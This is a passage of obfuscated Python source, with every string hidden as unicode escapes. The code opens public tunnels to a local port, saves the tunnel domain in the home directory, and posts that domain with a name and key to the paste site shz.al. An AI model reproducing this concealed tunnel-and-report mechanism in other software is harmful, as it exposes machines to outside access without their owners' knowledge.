            O0_var_1747 = {codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): (O0_var_1744 or codecs.decode('', 'unicode_escape')).strip().lower(), codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): O0_var_1746, codecs.decode('\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065', 'unicode_escape'): source, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): sorted(ports or [])}
            return (O0_var_1747, codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'), O0_var_1745)
        O0_var_1748 = O0_var_1744.strip().lower()
        with self._lock:
            if O0_var_1748 in self._items:
                O0_var_1749 = self._items[O0_var_1748]
                return (O0_var_1749.snapshot(), codecs.decode('\\u006e\\u0061\\u006d\\u0065\\u005f\\u0074\\u0061\\u006b\\u0065\\u006e', 'unicode_escape'), codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u5df2\\u5728\\u672c\\u0020\\u0061\\u0067\\u0065\\u006e\\u0074\\u0020\\u6ce8\\u518c\\u8868\\u4e2d\\u0020\\u0028\\u006b\\u006e\\u0061\\u006d\\u0065\\u0020\\u552f\\u4e00\\u0029', 'unicode_escape'))
        O0_var_1750 = HubTunnelManager(O0_var_1746, O0_var_1744, Config.PORT, ports=ports, source=source)
        O0_var_1750.start()
        O0_var_1751, O0_var_1752 = O0_var_1750.wait_connected(wait_timeout)
        if O0_var_1751:
            with self._lock:
                self._items[O0_var_1748] = O0_var_1750
            return (O0_var_1750.snapshot(), None, None)
        if isinstance(O0_var_1752, HubRegisterError):
            O0_var_1750.stop()
            O0_var_1747 = O0_var_1750.snapshot()
            O0_var_1747[codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] = codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')
            return (O0_var_1747, O0_var_1752.code, O0_var_1752.message)
        O0_var_1747 = O0_var_1750.snapshot()
        O0_var_1747[codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] = codecs.decode('\\u0072\\u0065\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006e\\u0067', 'unicode_escape')
        with self._lock:
            self._items[O0_var_1748] = O0_var_1750
        return (O0_var_1747, codecs.decode('\\u0075\\u006e\\u0072\\u0065\\u0061\\u0063\\u0068\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'), str(O0_var_1752 or codecs.decode('\\u0068\\u0075\\u0062\\u0020\\u8fde\\u63a5\\u672a\\u786e\\u8ba4', 'unicode_escape')))

    def unregister(self, O0_var_1753):
        O0_var_1754 = (O0_var_1753 or codecs.decode('', 'unicode_escape')).strip().lower()
        with self._lock:
            O0_var_1755 = self._items.pop(O0_var_1754, None)
        if O0_var_1755 is None:
            return None
        O0_var_1756 = O0_var_1755.snapshot()
        O0_var_1755.stop()
        return O0_var_1756

    def get(self, O0_var_1757):
        return self._items.get((O0_var_1757 or codecs.decode('', 'unicode_escape')).strip().lower())

    def list(self):
        with self._lock:
            O0_var_1758 = list(self._items.values())
        return [O0_var_1759.snapshot() for O0_var_1759 in O0_var_1758]

    def stop_all(self):
        with self._lock:
            O0_var_1760 = list(self._items.values())
            self._items.clear()
        for O0_var_1761 in O0_var_1760:
            O0_var_1761.stop()

class KModeController:
    _baseinfo_hooked = False
    _domain = None
    _SHZAL_NAME_CHARS = set(codecs.decode('\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0067\\u0068\\u0069\\u006a\\u006b\\u006c\\u006d\\u006e\\u006f\\u0070\\u0071\\u0072\\u0073\\u0074\\u0075\\u0076\\u0077\\u0078\\u0079\\u007a\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046\\u0047\\u0048\\u0049\\u004a\\u004b\\u004c\\u004d\\u004e\\u004f\\u0050\\u0051\\u0052\\u0053\\u0054\\u0055\\u0056\\u0057\\u0058\\u0059\\u005a\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u002b\\u005f\\u002d\\u005b\\u005d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f', 'unicode_escape'))
    _SHZAL_KEY_HINT_SHOWN = False

    @classmethod
    def kname_valid(cls):
        O0_var_1762 = Config.KNAME
        O0_var_1763 = (Config.KNAME_KEY or Config.KNAME) or codecs.decode('', 'unicode_escape')
        O0_var_1764 = []
        if not O0_var_1762 or len(O0_var_1762) < 3:
            O0_var_1764.append(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u8fc7\\u77ed\\u0020\\u0028', 'unicode_escape') + str(len(O0_var_1762)) + codecs.decode('\\u003c\\u0033\\u0029', 'unicode_escape'))
        if O0_var_1762 and (not set(O0_var_1762) <= cls._SHZAL_NAME_CHARS):
            O0_var_1764.append(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u542b\\u975e\\u6cd5\\u5b57\\u7b26\\u0020\\u0028\\u9650\\u5b57\\u6bcd\\u6570\\u5b57\\u53ca\\u0020\\u002b\\u005f\\u002d\\u005b\\u005d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f\\u0029', 'unicode_escape'))
        if len(O0_var_1763) < 8:
            O0_var_1764.append(codecs.decode('\\u5bc6\\u94a5\\u8fc7\\u77ed\\u0020\\u0028', 'unicode_escape') + str(len(O0_var_1763)) + codecs.decode('\\u003c\\u0038\\u002c\\u0020\\u5b9e\\u9645\\u4f7f\\u7528\\u0020', 'unicode_escape') + str('KNAME_KEY' if Config.KNAME_KEY else 'KNAME') + codecs.decode('\\u0029', 'unicode_escape'))
        O0_var_1765 = not O0_var_1764
        if not O0_var_1765 and (not cls._SHZAL_KEY_HINT_SHOWN):
            cls._SHZAL_KEY_HINT_SHOWN = True
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0032\\u0020\\u672a\\u751f\\u6548\\u002c\\u0020\\u6761\\u4ef6\\u4e0d\\u6ee1\\u8db3\\u003a\\u0020', 'unicode_escape') + str('; '.join(O0_var_1764)) + codecs.decode('\\u0020\\u0028\\u004b\\u004e\\u0041\\u004d\\u0045\\u003d', 'unicode_escape') + str(O0_var_1762 or '(未设置)') + codecs.decode('\\u002c\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059\\u003d', 'unicode_escape') + str(codecs.decode('\\u5df2\\u8bbe\\u7f6e\\u0028\\u006c\\u0065\\u006e\\u003d', 'unicode_escape') + str(len(Config.KNAME_KEY)) + codecs.decode('\\u0029', 'unicode_escape') if Config.KNAME_KEY else '(未设置, 缺省复用 KNAME)') + codecs.decode('\\u0029', 'unicode_escape'))
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f4a1\\u0020\\u4fee\\u6b63\\u003a\\u0020\\u8bbe\\u7f6e\\u0020\\u2265\\u0038\\u0020\\u5b57\\u7b26\\u7684\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u4e14\\u0020\\u0028\\u53ef\\u9009\\u0029\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059\\u0020\\u2265\\u0038\\u0020\\u5b57\\u7b26\\u002c\\u0020\\u4f8b\\u5982\\u003a\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u003d\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059\\u003d\\u006d\\u0079\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u002d\\u0070\\u0061\\u0073\\u0073', 'unicode_escape'))
        return O0_var_1765

    @classmethod
    def report_shzal(cls, domain, name=None, key=None):
        O0_var_1766 = name is None
        if name is None:
            name = Config.KNAME
        if key is None:
            key = Config.KNAME_KEY or Config.KNAME
        import urllib.error
        import urllib.request
        import uuid
        O0_var_1767 = codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061', 'unicode_escape') + uuid.uuid4().hex

        def body(O0_var_1768):
            O0_var_1769 = []
            for O0_var_1770, O0_var_1771 in O0_var_1768:
                O0_var_1769.append((codecs.decode('\\u002d\\u002d', 'unicode_escape') + str(O0_var_1767) + codecs.decode('\\u000d\\u000a\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0044\\u0069\\u0073\\u0070\\u006f\\u0073\\u0069\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0066\\u006f\\u0072\\u006d\\u002d\\u0064\\u0061\\u0074\\u0061\\u003b\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022', 'unicode_escape') + str(O0_var_1770) + codecs.decode('\\u0022\\u000d\\u000a\\u000d\\u000a', 'unicode_escape') + str(O0_var_1771) + codecs.decode('\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            O0_var_1769.append((codecs.decode('\\u002d\\u002d', 'unicode_escape') + str(O0_var_1767) + codecs.decode('\\u002d\\u002d\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            return b''.join(O0_var_1769)

        def post(O0_var_1772, O0_var_1773, method=codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape')):
            O0_var_1774 = urllib.request.Request(O0_var_1772, data=body(O0_var_1773), method=method)
            O0_var_1774.add_header(codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u0061\\u0072\\u0074\\u002f\\u0066\\u006f\\u0072\\u006d\\u002d\\u0064\\u0061\\u0074\\u0061\\u003b\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0061\\u0072\\u0079\\u003d', 'unicode_escape') + str(O0_var_1767))
            O0_var_1774.add_header(codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u0075\\u0072\\u006c\\u002f\\u0038\\u002e\\u0035\\u002e\\u0030', 'unicode_escape'))
            return urllib.request.urlopen(O0_var_1774, timeout=30)
        try:
            O0_var_1775 = [(codecs.decode('\\u0063', 'unicode_escape'), domain), (codecs.decode('\\u006e', 'unicode_escape'), name), (codecs.decode('\\u0073', 'unicode_escape'), key), (codecs.decode('\\u0065', 'unicode_escape'), codecs.decode('\\u0037\\u0064', 'unicode_escape'))]
            try:
                post(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f', 'unicode_escape'), O0_var_1775)
            except urllib.error.HTTPError as exc:
                if exc.code == 409:
                    post(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + str(name) + codecs.decode('\\u003a', 'unicode_escape') + str(key), [O0_var_1776 for O0_var_1776 in O0_var_1775 if O0_var_1776[0] != codecs.decode('\\u006e', 'unicode_escape')], method=codecs.decode('\\u0050\\u0055\\u0054', 'unicode_escape'))
                else:
                    if Config.DEBUG:
                        try:
                            O0_var_1777 = exc.read().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))[:200]
                        except Exception:
                            O0_var_1777 = codecs.decode('', 'unicode_escape')
                        Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u002d\\u0044\\u0045\\u0042\\u0055\\u0047\\u005d\\u0020\\u0072\\u0065\\u0070\\u006f\\u0072\\u0074\\u0020\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u003a\\u0020', 'unicode_escape') + str(exc.code) + codecs.decode('\\u0020\\u0062\\u006f\\u0064\\u0079\\u003a\\u0020', 'unicode_escape') + str(O0_var_1777))
                    raise
            if O0_var_1766:
                cls._domain = domain
            return True
        except Exception:
            return False

    @classmethod
    def report_domain_change(cls, domain, name=None, key=None):
        for O0_var_1778 in range(3):
            if cls.report_shzal(domain, name=name, key=key):
                return
            if O0_var_1778 < 2:
                time.sleep(2 ** (O0_var_1778 + 1))

    @classmethod
    def delete_shzal(cls, name, key):
        import urllib.error
        import urllib.request
        try:
            O0_var_1779 = urllib.request.Request(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + str(name) + codecs.decode('\\u003a', 'unicode_escape') + str(key), method=codecs.decode('\\u0044\\u0045\\u004c\\u0045\\u0054\\u0045', 'unicode_escape'))
            O0_var_1779.add_header(codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u0075\\u0072\\u006c\\u002f\\u0038\\u002e\\u0035\\u002e\\u0030', 'unicode_escape'))
            urllib.request.urlopen(O0_var_1779, timeout=30)
            return True
        except urllib.error.HTTPError as exc:
            if Config.DEBUG:
                Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u002d\\u0044\\u0045\\u0042\\u0055\\u0047\\u005d\\u0020\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0020\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u003a\\u0020', 'unicode_escape') + str(exc.code))
            return False
        except Exception:
            return False

    @staticmethod
    def _home_dir():
        for O0_var_1780 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
            if O0_var_1780 and os.path.isdir(O0_var_1780):
                return O0_var_1780
        return os.getcwd()

    @classmethod
    def resolve_domain_file_path(cls):
        O0_var_1781 = Config.KPATH.strip()
        if not O0_var_1781:
            return os.path.join(cls._home_dir(), codecs.decode('\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'))
        if O0_var_1781.startswith(codecs.decode('\\u0024\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')):
            O0_var_1781 = os.path.join(cls._home_dir(), O0_var_1781[5:].lstrip(codecs.decode('\\u002f\\u005c', 'unicode_escape'))) if len(O0_var_1781) > 5 else cls._home_dir()
        elif O0_var_1781.startswith(codecs.decode('\\u007e', 'unicode_escape')):
            O0_var_1781 = os.path.expanduser(O0_var_1781)
        return O0_var_1781

    @classmethod
    def write_domain_file(cls, domain):
        cls._domain = domain
        O0_var_1782 = cls.resolve_domain_file_path()
        try:
            O0_var_1783 = os.path.dirname(os.path.abspath(O0_var_1782))
            if O0_var_1783:
                os.makedirs(O0_var_1783, exist_ok=True)
            with open(O0_var_1782, codecs.decode('\\u0077', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_1784:
                O0_var_1784.write(domain)
            Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f4c4\\u0020\\u96a7\\u9053\\u57df\\u540d\\u5df2\\u5199\\u5165\\u003a\\u0020', 'unicode_escape') + str(O0_var_1782))
        except OSError as exc:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5199\\u5165\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(O0_var_1782) + codecs.decode('\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))

    @classmethod
    def delete_domain_file(cls):
        O0_var_1785 = cls.resolve_domain_file_path()
        try:
            if os.path.isfile(O0_var_1785):
                os.remove(O0_var_1785)
                Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f5d1\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5df2\\u5220\\u9664\\u003a\\u0020', 'unicode_escape') + str(O0_var_1785))
        except OSError as exc:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5220\\u9664\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(O0_var_1785) + codecs.decode('\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))

    @classmethod
    def on_baseinfo_success(cls):
        if not cls._baseinfo_hooked:
            cls._baseinfo_hooked = True
            cls.delete_domain_file()

    @classmethod
    def _stdin_loop(cls):
        while True:
            try:
                O0_var_1786 = sys.stdin.readline()
            except Exception:
                return
            if not O0_var_1786:
                return
            if O0_var_1786.strip() == codecs.decode('\\u002f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'):
                if cls._domain:
                    print(cls._domain, flush=True)
                else:
                    print(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u006e\\u006f\\u0074\\u0020\\u0072\\u0065\\u0061\\u0064\\u0079', 'unicode_escape'), flush=True)

    @classmethod
    def _tunnel_task(cls, manager, after_domain=None, silent=False, quic=False):
        try:
            manager.create_tunnel(Config.PORT, silent=silent, quic=quic, source=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'))
        except Exception as exc:
            if not silent:
                Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u542f\\u52a8\\u96a7\\u9053\\u521b\\u5efa\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(exc))
            return
        O0_var_1787 = manager.list_tunnels()
        if not O0_var_1787:
            return
        O0_var_1788 = O0_var_1787[-1][codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape')]
        if after_domain:
            after_domain(O0_var_1788)
        else:
            cls.write_domain_file(O0_var_1788)

    @classmethod
    def activate(cls, manager):
        if Config.KMODE == codecs.decode('\\u0032', 'unicode_escape') and cls.kname_valid():
            O0_var_1789 = Config.KMODE_QUIC
            Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f680\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0032\\u0025\\u0073\\u003a\\u0020\\u96a7\\u9053\\u57df\\u540d\\u5c06\\u4e0a\\u62a5\\u81f3\\u5916\\u90e8\\u5e73\\u53f0\\u0025\\u0073', 'unicode_escape') % (codecs.decode('\\u0071', 'unicode_escape') if O0_var_1789 else codecs.decode('', 'unicode_escape'), codecs.decode('\\u0020\\u0028\\u0051\\u0055\\u0049\\u0043\\u0020\\u4f20\\u8f93\\u0029', 'unicode_escape') if O0_var_1789 else codecs.decode('', 'unicode_escape')))
            manager.on_domain_change = lambda old_domain, new_domain: cls.report_domain_change(new_domain)
            threading.Thread(target=cls._tunnel_task, args=(manager,), kwargs={codecs.decode('\\u0061\\u0066\\u0074\\u0065\\u0072\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): cls.report_shzal, codecs.decode('\\u0073\\u0069\\u006c\\u0065\\u006e\\u0074', 'unicode_escape'): True, codecs.decode('\\u0071\\u0075\\u0069\\u0063', 'unicode_escape'): O0_var_1789}, daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')).start()
            return
        Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f680\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0031\\u003a\\u0020\\u542f\\u52a8\\u65f6\\u81ea\\u52a8\\u521b\\u5efa\\u4e34\\u65f6\\u96a7\\u9053', 'unicode_escape'))
        manager.on_domain_change = lambda old_domain, new_domain: cls.write_domain_file(new_domain)
        threading.Thread(target=cls._tunnel_task, args=(manager,), daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')).start()
        threading.Thread(target=cls._stdin_loop, daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0073\\u0074\\u0064\\u0069\\u006e', 'unicode_escape')).start()
_ARGO_BIND_KEY_SUFFIX = codecs.decode('\\u0031\\u0032\\u0033', 'unicode_escape')

def O0_fn_53(port):
    return str(Config.KNAME) + codecs.decode('\\u002d', 'unicode_escape') + str(port)

def O0_fn_54(name):
    return str(name) + str(_ARGO_BIND_KEY_SUFFIX)

def O0_fn_55(port, name=None, key=None):
    if name is None:
        O0_var_1790 = Config.KNAME or codecs.decode('', 'unicode_escape')
        if len(O0_var_1790) < 3:
            return codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u672a\\u8bbe\\u7f6e\\u6216\\u8fc7\\u77ed\\u0020\\u0028', 'unicode_escape') + str(len(O0_var_1790)) + codecs.decode('\\u003c\\u0033\\u0029\\u002c\\u0020\\u65e0\\u6cd5\\u6d3e\\u751f\\u4e0a\\u62a5\\u540d', 'unicode_escape')
        if not set(O0_var_1790) <= KModeController._SHZAL_NAME_CHARS:
            return codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u542b\\u975e\\u6cd5\\u5b57\\u7b26\\u0020\\u0028\\u9650\\u5b57\\u6bcd\\u6570\\u5b57\\u53ca\\u0020\\u002b\\u005f\\u002d\\u005b\\u005d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f\\u0029', 'unicode_escape')
        name = str(O0_var_1790) + codecs.decode('\\u002d', 'unicode_escape') + str(port)
    else:
        name = str(name)
    if key is None:
        key = O0_fn_54(name)
    else:
        key = str(key)
    if len(name) < 3:
        return codecs.decode('\\u4e0a\\u62a5\\u540d\\u8fc7\\u77ed\\u0020\\u0028', 'unicode_escape') + str(len(name)) + codecs.decode('\\u003c\\u0033\\u0029', 'unicode_escape')
    if not set(name) <= KModeController._SHZAL_NAME_CHARS:
        return codecs.decode('\\u4e0a\\u62a5\\u540d\\u542b\\u975e\\u6cd5\\u5b57\\u7b26\\u0020\\u0028\\u9650\\u5b57\\u6bcd\\u6570\\u5b57\\u53ca\\u0020\\u002b\\u005f\\u002d\\u005b\\u005d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f\\u0029', 'unicode_escape')
    if len(key) < 8:
        return codecs.decode('\\u7ba1\\u7406\\u5bc6\\u94a5\\u8fc7\\u77ed\\u0020\\u0028', 'unicode_escape') + str(len(key)) + codecs.decode('\\u003c\\u0038\\u002c\\u0020\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u5e73\\u53f0\\u5bc6\\u7801\\u7ea6\\u675f\\u0029', 'unicode_escape')
    return None

class ArgoTunnelInfo(BaseModel):
    tunnel_domain: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7684\\u672c\\u5730\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: str = Field(..., description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    status: Optional[str] = Field(default=None, description=codecs.decode('\\u96a7\\u9053\\u72b6\\u6001\\u003a\\u0020\\u0061\\u006c\\u0069\\u0076\\u0065\\u007c\\u0072\\u0065\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006e\\u0067\\u007c\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), examples=[codecs.decode('\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape')])
    last_error: Optional[str] = Field(default=None, description=codecs.decode('\\u6700\\u8fd1\\u5931\\u8d25\\u539f\\u56e0\\u0020\\u0028\\u622a\\u65ad\\u0020\\u0033\\u0030\\u0030\\u0020\\u5b57\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0045\\u0043\\u004f\\u004e\\u004e\\u0052\\u0045\\u0046\\u0055\\u0053\\u0045\\u0044', 'unicode_escape')])
    last_error_at: Optional[str] = Field(default=None, description=codecs.decode('\\u6700\\u8fd1\\u5931\\u8d25\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0031\\u0031\\u002d\\u0030\\u0039\\u0054\\u0031\\u0034\\u003a\\u0032\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    consecutive_failures: Optional[int] = Field(default=None, description=codecs.decode('\\u8fde\\u7eed\\u5931\\u8d25\\u8f6e\\u6570', 'unicode_escape'), examples=[0])
    last_registered_at: Optional[str] = Field(default=None, description=codecs.decode('\\u6700\\u8fd1\\u6210\\u529f\\u6ce8\\u518c\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0031\\u0031\\u002d\\u0030\\u0039\\u0054\\u0031\\u0034\\u003a\\u0031\\u0030\\u003a\\u0033\\u0036\\u005a', 'unicode_escape')])
    shz_name: Optional[str] = Field(default=None, description=codecs.decode('\\u7ed1\\u5b9a\\u4e0a\\u62a5\\u540d\\u0020\\u0028\\u7f3a\\u7701\\u6d3e\\u751f\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u002d\\u7aef\\u53e3\\u002c\\u0020\\u63a5\\u53e3\\u53ef\\u663e\\u5f0f\\u6307\\u5b9a\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u002d\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])
    shz_url: Optional[str] = Field(default=None, description=codecs.decode('\\u7ed1\\u5b9a\\u4e0a\\u62a5\\u5730\\u5740\\u0020\\u0028\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u53d1\\u5e03\\u9875\\u5b8c\\u6574\\u0020\\u0055\\u0052\\u004c\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u002d\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])

class ArgoTunnelListResponse(SResponse):
